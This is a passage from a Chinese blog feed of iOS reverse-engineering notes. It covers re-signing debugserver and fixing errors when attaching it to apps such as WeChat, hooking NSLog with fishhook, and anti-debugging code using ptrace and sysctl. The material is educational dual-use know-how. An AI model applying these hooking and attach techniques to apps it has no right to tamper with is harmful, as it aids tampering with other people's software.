id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="文件瘦身"><a href="#文件瘦身" class="headerlink" title="文件瘦身"></a>文件瘦身</h3><p>可以对debugserver进行瘦身减少文件大小(可选)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">lipo   info debugserver<span class="hljs-regexp">//</span>查看文件架构<br>lipo -thin arm64 debugserver -o _debugserver   <span class="hljs-regexp">//</span>瘦身<br>lipo。create  文件A  文件B  -output  文件C <span class="hljs-regexp">//</span>架构合并<br></code></pre></td></tr></table></figure><h3 id="苹果codesign签名方式"><a href="#苹果codesign签名方式" class="headerlink" title="苹果codesign签名方式"></a>苹果codesign签名方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">codesign -d -vv debugserver    // 详细的签名信息<br>codesign -s - --entitlements ent.plist -f debugserver<br></code></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul><li><p>Failed to get connection from a remote gdb process</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">iPhone-7:~ root# debugserver 127.0.0.1:1111 -a UCWEB<br>debugserver-@(#)PROGRAM:LLDB  PROJECT:lldb-900.3.85<br> for arm64.<br>Attaching to process UCWEB...<br>Listening to port 1111 for a connection from localhost...<br>Failed to get connection from a remote gdb process.<br>Exiting.<br></code></pre></td></tr></table></figure><p>解决方案:</p><ol><li><p>USB连接可能不稳定，重新插拔一下。</p></li><li><p>设备上可能已经有一个进程占用了端口1111，导致无法连接，ps -e看下是否有debugserver已经在运行，是的话就使用killall -9 debugserver，或者直接尝试换一个调试端口。</p></li><li><p>可能是你签名debugserver的权限文件中包含以下权限导致</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.network.server<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.network.client<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>seatbelt-profiles<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>debugserver<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​       </p></li></ol></li><li><p> failed to attach to process named</p></li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Phone-7:~ root<span class="hljs-comment"># debugserver localhost:1111 -a UCWEB</span><br>debugserver-@(<span class="hljs-comment">#)PROGRAM:LLDB  PROJECT:lldb-900.3.85</span><br> <span class="hljs-keyword">for</span> arm64.<br>Attaching to process UCWEB...<br>error: failed to attach to process named: <span class="hljs-string">&quot;&quot;</span><br>Exiting.<br></code></pre></td></tr></table></figure><p>  解决方案:找不到名字叫UCWEB的进程。尝试启动UCWEB后再执行命令即可。</p><ul><li><p>rejecting incoming connection from ::ffff:127.0.0.1</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">iPhone<span class="hljs-string">-7</span>:~ root# debugserver *:1111 -a WeChat<br>debugserver-@(#)PROGRAM:LLDB  PROJECT:lldb<span class="hljs-string">-900</span>.3.57..2<br> for arm64.<br>Attaching to process WeChat...<br>Listening to port 1111 for a connection from *...<br><span class="hljs-keyword">error: </span>rejecting incoming connection from ::ffff:127.0.0.1 (expecting ::1)<br></code></pre></td></tr></table></figure><p>解决方案:<br>解决办法是指定使用ipv4地址<br>手机端：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">iPhone<span class="hljs-number">-7</span><span class="hljs-symbol">:~</span> root<span class="hljs-comment"># debugserver 127.0.0.1:1111 -a WeChat</span><br></code></pre></td></tr></table></figure><p>电脑端使用iproxy 2222 1111</p>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(lldb) process connect connect:<span class="hljs-comment">//127.0.0.1:2222</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>osre.com<span class="hljs-regexp">/t/i</span>os12-debugserver-lldb/<span class="hljs-number">14429</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iOS</tag>
      
      <tag>调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之fishhook</title>
    <link href="/2021/08/22/iOS%E4%B9%8Bfishhook/"/>
    <url>/2021/08/22/iOS%E4%B9%8Bfishhook/</url>
    
    <content type="html"><![CDATA[<h2 id="fishhook"><a href="#fishhook" class="headerlink" title="fishhook"></a>fishhook</h2><p><a href="https://github.com/facebook/fishhook">fishHook</a>是Facebook提供的一个动态修改链接mach-O文件的工具。利用MachO文件加载原理，通过重新绑定(rebind_symbols)懒加载表(Lazy Symbol Pointers)和非懒加载表(Non-Lazy Symbol Pointers)这两个表的指针达到C函数HOOK的目的。</p><blockquote><p>dyld加载macho文件和系统框架,对函数地址复制的过程，成为 <strong>“符号绑定“</strong></p></blockquote><h2 id="调试分析fishHook"><a href="#调试分析fishHook" class="headerlink" title="调试分析fishHook"></a>调试分析fishHook</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">//</span><br><span class="hljs-comment">//  ViewController.m</span><br><span class="hljs-comment">//  fishhook</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  Created by Cola on 2020/5/24.</span><br><span class="hljs-comment">//  Copyright © 2020 Cola. All rights reserved.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#import <span class="hljs-meta-string">&quot;ViewController.h&quot;</span></span><br><span class="hljs-meta">#import <span class="hljs-meta-string">&quot;fishhook.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span><br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span><br><br>- (<span class="hljs-keyword">void</span>)viewDidLoad &#123;<br>    [<span class="hljs-keyword">super</span> viewDidLoad];<br>   <br>    <span class="hljs-comment">//一个rebinding hook一个函数,想要hook多个函数，可以将rebinding添加至数组</span><br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;1&quot;</span>);<br>    <span class="hljs-comment">//更改系统的NSLoga函数</span><br>    <span class="hljs-keyword">struct</span> rebinding nslog;<br>    nslog.name = <span class="hljs-string">&quot;NSLog&quot;</span>;<br>    nslog.replacement = myNSLog;<br>    nslog.replaced = &amp;sys_nslog;<br>    <br>    <span class="hljs-keyword">struct</span> rebinding rebs[<span class="hljs-number">1</span>] = &#123;nslog&#125;;<br>    <br>    <br>    rebind_symbols(rebs, <span class="hljs-number">1</span>);<br>     <br>&#125;<br><br>- (<span class="hljs-keyword">void</span>)touchesBegan:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event&#123;<br> <br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;点击&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//函数指针</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> (*sys_nslog)(<span class="hljs-built_in">NSString</span> * _Nonnull format, ...);<br> <br><span class="hljs-comment">//定义一个新的函数</span><br><span class="hljs-keyword">void</span> myNSLog(<span class="hljs-built_in">NSString</span> * _Nonnull format, ...)&#123;<br>    format = [format stringByAppendingFormat:<span class="hljs-string">@&quot;\n HOOK成功🐂&quot;</span>];<br>    sys_nslog(format);<br>&#125;<br><br><span class="hljs-keyword">@end</span><br></code></pre></td></tr></table></figure><ol><li><p>通过machoView查看符号表(Lazy Symbol Pointers)的偏移量(比如NSLog的偏移量是) 0x00005000</p></li><li><p>在<code>rebind_symbols(rebs, 1);</code>下断点,</p></li><li><p>通过image list查看加载的macho文件和所有的框架</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">(lldb) image list<br>[  <span class="hljs-number">0</span>] E10158F5-<span class="hljs-number">413</span>E-<span class="hljs-number">35</span>E1-A349-<span class="hljs-number">8</span>AFA71FFC955 <span class="hljs-number">0</span>x0000000103db1000 <span class="hljs-regexp">/Users/</span>cola<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/Xcode/</span>DerivedData<span class="hljs-regexp">/fishhook-dduxiymrdkidvtcxqmuqqwanbexr/</span>Build<span class="hljs-regexp">/Products/</span>Debug-iphonesimulator<span class="hljs-regexp">/fishhook.app/</span>fishhook <br>[  <span class="hljs-number">1</span>] EEA931D0-<span class="hljs-number">403</span>E-<span class="hljs-number">3</span>BC8-<span class="hljs-number">862</span>A-CBA037DE4A74 <span class="hljs-number">0</span>x00000001048e3000 <span class="hljs-regexp">/usr/</span>lib/dyld <br>[  <span class="hljs-number">2</span>] <span class="hljs-number">75369</span>F31-<span class="hljs-number">702</span>D-<span class="hljs-number">364</span>A-<span class="hljs-number">95</span>C3-<span class="hljs-number">8</span>AFA9DD4B3A2 <span class="hljs-number">0</span>x0000000103dbf000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/u</span>sr<span class="hljs-regexp">/lib/</span>dyld_sim <br>[  <span class="hljs-number">3</span>] <span class="hljs-number">56</span>E47800-<span class="hljs-number">2</span>CCB-<span class="hljs-number">3</span>B7D-B94B-CCF5F13D6BCF <span class="hljs-number">0</span>x00007fff256b8000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/</span>System<span class="hljs-regexp">/Library/</span>Frameworks<span class="hljs-regexp">/Foundation.framework/</span>Foundation <br>[  <span class="hljs-number">4</span>] <span class="hljs-number">3</span>EC683F6-<span class="hljs-number">36</span>EF-<span class="hljs-number">33</span>E1-<span class="hljs-number">8</span>B98-C95E12BA38D2 <span class="hljs-number">0</span>x00007fff513f6000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/u</span>sr<span class="hljs-regexp">/lib/</span>libobjc.A.dylib <br>[  <span class="hljs-number">5</span>] <span class="hljs-number">7881</span>AD7F-<span class="hljs-number">524</span>C-<span class="hljs-number">3</span>CFA-<span class="hljs-number">9595</span>-<span class="hljs-number">02</span>ED549166AA <span class="hljs-number">0</span>x00007fff4ff15000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/u</span>sr<span class="hljs-regexp">/lib/</span>libSystem.B.dylib <br><br>.......<br></code></pre></td></tr></table></figure></li><li><p>macho文件的首地址+第一步的偏移量，就是NSLog的真实地址,读NSLog的符号表地址</p><p>memory read  简写   x 0x0000000103db1000+0x00005000</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(lldb) memory read 0x0000000103db1000+0x00005000<br>0x103db6000: fa 2d<span class="hljs-number"> 76 </span>25 ff 7f<span class="hljs-number"> 00 </span>00 f8 d1<span class="hljs-number"> 74 </span>25 ff 7f<span class="hljs-number"> 00 </span>00  .-v%......t%....<br>0x103db6010: f8<span class="hljs-number"> 26 </span>09<span class="hljs-number"> 48 </span>ff 7f<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 44 </span>34 db<span class="hljs-number"> 03 </span>01<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> .&amp;.H....D4......<br></code></pre></td></tr></table></figure></li><li><p>其中前八个字节为NSLog的地址<br>查看4中的前八个字节的地址的汇编代码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(lldb) dis -s <span class="hljs-number">0x7fff25762dfa</span><br>Foundation`NSLog:<br>    <span class="hljs-number">0x7fff25762dfa</span> &lt;+<span class="hljs-number">0</span>&gt;:  pushq  <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x7fff25762dfb</span> &lt;+<span class="hljs-number">1</span>&gt;:  movq   <span class="hljs-variable">%rsp</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x7fff25762dfe</span> &lt;+<span class="hljs-number">4</span>&gt;:  subq   $<span class="hljs-number">0xd0</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rsp</span><br>    <span class="hljs-number">0x7fff25762e05</span> &lt;+<span class="hljs-number">11</span>&gt;: testb  <span class="hljs-variable">%al</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%al</span><br>    <span class="hljs-number">0x7fff25762e07</span> &lt;+<span class="hljs-number">13</span>&gt;: je     <span class="hljs-number">0x7fff25762e2f</span>            <span class="hljs-comment">; &lt;+53&gt;</span><br>    <span class="hljs-number">0x7fff25762e09</span> &lt;+<span class="hljs-number">15</span>&gt;: movaps <span class="hljs-variable">%xmm0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span>xa<span class="hljs-number">0</span>(<span class="hljs-variable">%rbp</span>)<br>    <span class="hljs-number">0x7fff25762e10</span> &lt;+<span class="hljs-number">22</span>&gt;: movaps <span class="hljs-variable">%xmm1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">90</span>(<span class="hljs-variable">%rbp</span>)<br></code></pre></td></tr></table></figure><p>从中可以看见NSLog的地址</p></li><li><p>单步执行，执行fishhook的rebind_symbols方法后查看NSLog的真实地址</p><p>和4相比地址已经改变</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(lldb) memory read 0x000000010f550000+0x00005000<br>0x10f555000:<span class="hljs-number"> 50 </span>14<span class="hljs-number"> 55 </span>0f<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00 f8 d1<span class="hljs-number"> 74 </span>25 ff 7f<span class="hljs-number"> 00 </span>00  P.U.......t%....<br>0x10f555010: f8<span class="hljs-number"> 26 </span>09<span class="hljs-number"> 48 </span>ff 7f<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 54 </span>99<span class="hljs-number"> 34 </span>52 ff 7f<span class="hljs-number"> 00 </span>00  .&amp;.H....T.4R....<br></code></pre></td></tr></table></figure></li><li><p>查看前八个字节对应地址的汇编代码，发现已经被替换成我们的myNSlog方法</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(lldb) dis -s <span class="hljs-number">010</span>f<span class="hljs-number">551450</span><br>fishhook`myNSLog:<br>    <span class="hljs-number">0x10f551450</span> &lt;+<span class="hljs-number">0</span>&gt;:  pushq  <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x10f551451</span> &lt;+<span class="hljs-number">1</span>&gt;:  movq   <span class="hljs-variable">%rsp</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x10f551454</span> &lt;+<span class="hljs-number">4</span>&gt;:  subq   $<span class="hljs-number">0x30</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rsp</span><br>    <span class="hljs-number">0x10f551458</span> &lt;+<span class="hljs-number">8</span>&gt;:  movq   $<span class="hljs-number">0x0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%rbp</span>)<br>    <span class="hljs-number">0x10f551460</span> &lt;+<span class="hljs-number">16</span>&gt;: leaq   <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%rbp</span>)<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>    <span class="hljs-number">0x10f551464</span> &lt;+<span class="hljs-number">20</span>&gt;: movq   <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>(<span class="hljs-variable">%rbp</span>)<br>    <span class="hljs-number">0x10f551468</span> &lt;+<span class="hljs-number">24</span>&gt;: movq   <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rdi</span><br>    <span class="hljs-number">0x10f55146b</span> &lt;+<span class="hljs-number">27</span>&gt;: movq   <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>(<span class="hljs-variable">%rbp</span>)<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rsi</span><br>(lldb) <br></code></pre></td></tr></table></figure></li><li><p>调用原方法</p><p>因为系统默认绑定的地址被保存到了，自定义的变量中，可以通过地址调用该方法。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">//函数指针</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> (*sys_nslog)(<span class="hljs-built_in">NSString</span> * _Nonnull format, ...);<br></code></pre></td></tr></table></figure><p>调用原方法</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">//定义一个新的函数</span><br>void myNSLog(NSString * <span class="hljs-variable">_Nonnull</span> <span class="hljs-built_in">format</span>, ...)&#123;<br>    <span class="hljs-built_in">format</span> = [<span class="hljs-built_in">format</span> stringByAppendingFormat:@<span class="hljs-string">&quot;\n HOOK成功🐂&quot;</span>];<br>    sys_nslog(<span class="hljs-built_in">format</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="fishHOOK原理"><a href="#fishHOOK原理" class="headerlink" title="fishHOOK原理"></a>fishHOOK原理</h2><p><strong>重新绑定符号表</strong></p><p>懒加载符号表与indirect symbols表一一对应</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/%E6%87%92%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7%E8%A1%A8.png" class=""><p>indirect symbols表中NSLog的Data值为A6</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/indirectsymbols%E8%A1%A8.png" class=""><p>A6转为10进制为166,其中166对应着Symbols Table下的Symbols</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/Symbols.png" class=""><p>其中 #166在String Table Index表的偏移为D7，符号表基址为83AC，NSLog的地址为 83AC+D7=8483</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/StringTable.png" class=""><p>而fishHook则是逆过程，通过String Table表NSLog的地址，找到Lazy Symbols Pointers(懒加载符号表)中的NSLog符号表地址，获取懒加载符号表的偏移.</p><h2 id="fishHOOK能做什么"><a href="#fishHOOK能做什么" class="headerlink" title="fishHOOK能做什么"></a>fishHOOK能做什么</h2><ol><li><p>应用安全防护：</p><p> 将系统敏感函数，真实地址保存，并将该方法设置为宏定义,以后使用宏定义设置的方法，别人就无法HOOK该方法了，因为你使用的是函数的真实地址，并不是调用符号表中的函数地址，这样别人修改符号表是不影响程序的。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h4><p> 三方框架有可能会用到该函数，如果fishhook加载的过早会导致三方框架失效。</p></li></ol><ol start="2"><li><p>启动优化、埋点、AOP</p><ul><li>定位所有方法的调用，hook objc_msgSend函数?</li><li>二进制重排(layout)的目的在于将hot code聚合在一起，即使得最经常执行的代码或最需要关键执行的代码（如启动阶段的顺序调用）聚合在一起，形成一个更紧凑的__TEXT段。</li></ul></li></ol><p>​    </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
      <tag>fishhook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之反调试</title>
    <link href="/2021/08/22/iOS%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <url>/2021/08/22/iOS%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="ptrace-反调"><a href="#ptrace-反调" class="headerlink" title="ptrace 反调"></a>ptrace 反调</h2><p>ptrace反调试，阻止LLDB附加调试</p><p>在Unix 系统中，提供了一个系统调用 ptrace 用于实现断点调试和对进程进行跟踪和控制，而 PT_DENY_ATTACH 是苹果增加的一个 ptrace 选项，这个参数用来告诉系统，阻止调试器依附，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案,代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">#import &lt;dlfcn.h&gt;<br><br>#import &lt;sys/types.h&gt;<br><br>typedef int (*ptrace_ptr_t)(int _request, pid_t pid, caddr_t _addr, int _data);<br><br>#if !defined(PT_DENT_ATTACH)<br><br>#define PT_DENT_ATTACH 31<br><br>#endif<br><br>void disable_debug() &#123;<br><br>        void * handle = dlopen(0, RTLD_GLOBAL|RTLD_NOW);<br>    <br>        ptrace_ptr_t ptrace_ptr = dlsym(handle, &quot;ptrace&quot;);<br>    <br>        ptrace_ptr(PT_DENT_ATTACH, 0, 0, 0);<br>    <br>        dlclose(handle);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="sysctl反调试"><a href="#sysctl反调试" class="headerlink" title="sysctl反调试"></a>sysctl反调试</h2><p>当一个进程被调试的时候，该进程会有一个标记来标记自己正在被调试，所以可以通过sysctl去查看当前进程的信息，看有没有这个标记位即可检查当前调试状态。</p><p>函数介绍</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">函数的返回值若为<span class="hljs-number">0</span>时，证明没有错误，其他数字为错误码。<br><br>arg1 传入一个数组，该数组中的第一个元素指定本请求定向到内核的哪个子系统。第二个及其后元素依次细化指定该系统的某个部分。<br><br>arg2 数组中的元素数目<br><br>arg3 一个结构体，指向一个供内核存放该值的缓冲区，存放进程查询结果<br><br>arg4 缓冲区的大小<br><br>arg5/arg6 为了设置某个新值，arg5参数指向一个大小为arg6参数值的缓冲区。如果不准备指定一个新值，那么arg5应为一个空指针，arg6因为<span class="hljs-number">0.</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *, u_int, <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">size_t</span> *, <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">size_t</span>)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs objective-c"><br>#import &lt;sys/sysctl.h&gt;<br><br>#import &lt;sys/types.h&gt;<br><br>#import &lt;unistd.h&gt;<br><br>static bool is_debugger_present(void) &#123;<br><br>    int name[4];//存放字节码，查询信息<br><br>    struct kinfo_proc info;//接受进程查询结果信息的结构体<br><br>    size_t info_size = sizeof(info);//结构体的大小<br><br>    info.kp_proc.p_flag = 0;<br><br>    name[0] = CTL_KERN;//内核查看<br><br>    name[1] = KERN_PROC;//进程查看<br><br>    name[2] = 